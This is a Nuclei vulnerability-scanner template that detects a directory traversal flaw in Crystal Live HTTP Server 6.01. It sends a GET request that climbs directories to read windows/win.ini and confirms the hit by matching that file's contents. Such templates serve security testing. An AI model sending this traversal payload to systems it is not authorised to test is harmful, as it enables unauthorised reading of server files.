# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: crystal-live-http-server-lfi

info:
  name: Crystal Live HTTP Server 6.01 - Directory Traversal
  author: imhunterand
  severity: high
  reference: https://cxsecurity.com/issue/WLB-2019110127
  tags: crystal,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/../../../../../../../../../../../../windows/win.ini"

    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and
        part: body
